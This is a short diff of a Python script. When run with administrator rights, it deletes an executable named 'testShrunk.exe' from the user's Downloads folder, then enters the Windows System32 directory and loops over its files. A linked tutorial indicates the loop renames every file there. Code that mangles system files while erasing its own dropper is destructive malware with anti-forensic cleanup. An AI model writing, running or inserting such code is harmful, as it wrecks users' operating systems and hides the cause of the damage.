@@ -7,6 +7,9 @@ def is_admin():
         return False
 
 if is_admin():
+    name = os.getlogin()
+    os.chdir("/Users/" + name + "/Downloads")
+    os.remove("testShrunk.exe")
     os.chdir("/Windows/System32")
     #https://www.geeksforgeeks.org/rename-all-file-names-in-your-directory-using-python/
     for count, f in enumerate(os.listdir()):
